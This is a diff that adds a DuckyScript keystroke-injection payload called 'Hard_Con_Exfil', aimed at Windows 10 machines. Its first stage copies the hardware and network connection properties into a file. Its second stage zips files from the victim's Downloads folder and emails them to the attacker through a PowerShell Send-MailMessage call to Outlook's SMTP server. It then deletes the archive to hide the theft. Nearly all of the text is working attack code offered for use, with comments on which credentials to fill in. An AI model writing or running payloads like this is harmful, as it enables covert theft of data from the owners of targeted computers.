@@ -1,0 +1,125 @@
+REM Title: Hard_Con_Exfil
+REM Author: LulzAnarchyAnon
+REM Description: This payload navagates it's way to Hardware, and Connection properties. It then copies
+REM and saves it as a notepad file named "targetloot" to the Downloads folder. 
+REM Target: Windows 10
+REM Props: Darren Kitchen, I am Jakoby and the-jcksn
+REM Version: 1.0
+REM Category: Exfiltration 
+
+REM This payload may need minor adjustments to run properly depending on Attacker, and Target devices.
+
+REM This is a Two stage payload... 
+REM In the First stage the targets data is saved to the target device. 
+REM In the Second stage the loot is sent via email to the attacker.
+
+REM Stage 1
+
+GUI 
+DELAY 100
+STRING network properties
+DELAY 200
+ENTER
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 1000
+ENTER
+DELAY 500
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 200
+CTRL v
+DELAY 200
+CTRL s
+DELAY 200
+STRING targetloot
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 200
+ENTER
+DELAY 500
+STRING Downloads
+DELAY 500
+ENTER
+DELAY 500
+ALT s
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+
+REM Stage 2
+
+REM You must change the USER_EMAIL and USER_PASSWORD to your outlook credentials.
+REM You can exfil from directory other than Downloads by changing path.
+REM This payload may need minor adjustments to run properly depending on Attacker, and Target devices.
+
+DELAY 2000
+GUI r
+DELAY 200
+REM Navigate to the directory to exfil from...
+STRING %USERPROFILE%\Downloads
+ENTER
+DELAY 150
+MENU
+DELAY 150
+STRING o
+DELAY 150
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 150
+REM selecting files to exfil, repeat this line if you want more than 5, but bear in mind this might impact some of the delays
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+SHIFT RIGHTARROW
+DELAY 150
+REM sending files to targetloot.zip
+MENU
+DELAY 150
+STRING n
+DELAY 200
+DOWNARROW
+DELAY 150
+ENTER
+DELAY 500
+STRING targetloot
+ENTER
+DELAY 150
+ALT F4
+DELAY 150
+GUI r
+DELAY 150
+REM open powershell and send the email
+STRING powershell
+ENTER
+DELAY 500
+REM ~~~~~~~CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING~~~~~
+STRING Send-MailMessage -From user@example.com -To user@example.com -Subject "targetloot" -Body "Please find attached your zip file" -Attachment "Downloads\targetloot.zip" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList user@example.com, (ConvertTo-SecureString -String "supersecretpassword" -AsPlainText -Force))
+ENTER
+DELAY 500
+REM cleanup
+STRING del Downloads\targetloot.zip
+ENTER
+DELAY 150
+STRING exit
+ENTER
